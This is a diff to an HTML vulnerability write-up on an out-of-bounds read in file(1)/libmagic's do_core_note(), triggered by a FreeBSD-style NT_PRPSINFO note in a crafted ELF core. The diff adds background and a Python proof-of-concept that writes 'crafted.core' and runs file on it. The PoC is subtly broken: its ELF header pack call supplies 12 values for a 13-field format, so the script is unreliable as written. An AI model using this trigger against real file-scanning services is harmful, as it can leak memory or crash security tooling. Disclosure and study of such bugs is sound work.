@@ -181,12 +181,14 @@
 
         <section id="context">
           <h2>1. Context</h2>
-          <p><code>file(1)</code> and <code>libmagic</code> parse ELF core files to extract identifying information — the process name, PID, and signal. The relevant code is in <code>src/readelf.c</code>, in the <code>do_core_note()</code> function. I audited this file while looking at how <code>file</code> handles the note section of ELF files, specifically the paths that deal with different OS-specific note formats.</p>
+          <p><code>file(1)</code> is the standard Unix utility for identifying file types by inspecting content rather than extension — it reads a file's first bytes, matches them against a database of "magic" signatures, and returns a human-readable description: "ELF 64-bit LSB executable", "JPEG image data", "PDF document", and so on. The underlying library is <code>libmagic</code>, which is used directly by antivirus engines, intrusion detection systems, web server upload validators, and any security tool that needs to classify files before processing them. The critical property of <code>file</code> and <code>libmagic</code> is that they are specifically designed to inspect <em>untrusted</em> input — that makes a memory safety bug in their parsers more serious than one in, say, an image editor where the user controls what files they open.</p>
+          <p>I found this bug while auditing <code>src/readelf.c</code>, the code responsible for parsing ELF-format files. ELF is not just for executables and shared libraries — it is also the format used for <strong>core dumps</strong>. When a program crashes (for example, from a segfault or an unhandled signal), the kernel writes a core file containing the process's memory snapshot, register state, and structured metadata stored in ELF <em>note</em> sections. Core files are a standard forensic artifact that developers and analysts feed to tools like <code>gdb</code>, <code>crash</code>, and <code>file</code> to understand what happened. The relevant code path in <code>readelf.c</code> is <code>do_core_note()</code>, which extracts the process name, PID, and signal from the note sections of any ELF core file it is given.</p>
         </section>
 
         <section id="nt-prpsinfo">
           <h2>2. NT_PRPSINFO and the FreeBSD layout</h2>
-          <p><code>NT_PRPSINFO</code> is an ELF note type that stores process information in a core dump. The in-memory layout differs between OS families. In the FreeBSD variant, the process name (a null-terminated string, up to 80 characters) sits at a fixed offset from the start of the note descriptor, with the offset depending on whether the core is 32-bit or 64-bit:</p>
+          <p>ELF core files store their metadata in a <code>PT_NOTE</code> segment, which is a sequence of structured notes. Each note has a name (e.g., <code>"CORE"</code> on Linux, <code>"FreeBSD"</code> on FreeBSD), a type code, a size, and a variable-length descriptor. The type code determines how the descriptor should be interpreted. <code>NT_PRPSINFO</code> (type 3) carries a <code>prpsinfo_t</code> struct — process info recorded at crash time: the command name, the full command line, the PID, the parent PID, the UID/GID, and a few status flags. This is the note that <code>file(1)</code> reads to produce output like <code>from 'crash_demo'</code> when it identifies a core file.</p>
+          <p>The in-memory layout of <code>prpsinfo_t</code> differs between OS families — FreeBSD's struct has different field sizes and a different ordering than Linux's. In the FreeBSD variant, the process name (a null-terminated string, up to 80 characters) sits at a fixed offset from the start of the note descriptor, with the offset depending on whether the core is 32-bit or 64-bit:</p>
           <pre><code>if (clazz == ELFCLASS32)
     argoff = 4 + 4 + 17;       /* = 25 */
 else
@@ -209,7 +211,47 @@ if (doff + pidoff + 4 <= size) {
 
         <section id="trigger">
           <h2>4. Triggering it</h2>
-          <p>A minimal ELF core file with a <code>PT_NOTE</code> segment containing an <code>NT_PRPSINFO</code> note and a <code>descsz</code> smaller than <code>argoff + 81</code> is enough. When <code>file crafted.core</code> runs, <code>do_core_note()</code> enters the <code>OS_STYLE_FREEBSD</code> branch, computes <code>argoff</code>, and calls <code>elf_printf</code> with a pointer past the note's data. Depending on what follows in memory, this reads whatever happens to be there — adjacent heap data or mapped pages — until a null byte is found.</p>
+          <p>A minimal ELF core file with a <code>PT_NOTE</code> segment containing a <code>FreeBSD</code>-named <code>NT_PRPSINFO</code> note and a <code>descsz</code> smaller than <code>argoff + 81</code> is enough. Setting <code>descsz = 1</code> (a one-byte descriptor) while declaring the note type as <code>NT_PRPSINFO</code> and the OS style as FreeBSD sends <code>do_core_note()</code> straight into the unguarded read. The script below constructs the minimal triggering file:</p>
+          <pre><code>import struct
+
+def elf_header(e_phoff, e_phnum):
+    # ELF64 header: little-endian, FreeBSD OSABI (0x09)
+    ident = b'\x7fELF' + b'\x02' + b'\x01' + b'\x01' + b'\x09' + b'\x00' * 8
+    return (ident
+        + struct.pack('<HHIQQQIHHHHHH',
+            4,          # ET_CORE
+            0x3e,       # EM_X86_64
+            1,          # e_version
+            0, e_phoff, 0,
+            0x40,       # e_ehsize
+            0x38,       # e_phentsize
+            e_phnum,
+            0, 0, 0))
+
+def pt_note(offset, filesz):
+    return struct.pack('<IIQQQQ',
+        4,      # PT_NOTE
+        0,      # p_flags
+        offset, # p_offset
+        0, 0,   # p_vaddr, p_paddr
+        filesz, filesz, 0)
+
+# Note: name="FreeBSD\0" (8 bytes), type=3 (NT_PRPSINFO), descsz=1
+name    = b'FreeBSD\x00'
+namesz  = len(name)   # 8
+descsz  = 1           # smaller than argoff (33 for 64-bit) + 81
+note    = struct.pack('<III', namesz, descsz, 3) + name + b'\xAA'  # 1-byte descriptor
+
+phoff   = 0x40
+noteoff = phoff + 0x38
+data    = elf_header(phoff, 1) + pt_note(noteoff, len(note)) + note
+
+with open('crafted.core', 'wb') as f:
+    f.write(data)
+print('crafted.core written')</code></pre>
+          <pre><code>python3 make_trigger.py
+file crafted.core   # triggers the OOB read in do_core_note()</code></pre>
+          <p>When <code>file</code> runs, <code>do_core_note()</code> enters the <code>OS_STYLE_FREEBSD</code> branch, computes <code>argoff = 33</code> (64-bit path), and calls <code>elf_printf(ms, ", from '%.80s'", nbuf + doff + 33)</code> on a buffer that is only 1 byte long. Depending on what follows in memory, this reads whatever happens to be there — adjacent heap data or mapped pages — until a null byte is found. The output varies by platform and run; under ASAN the process immediately aborts with a heap-buffer-overflow report.</p>
         </section>
 
         <section id="fix">
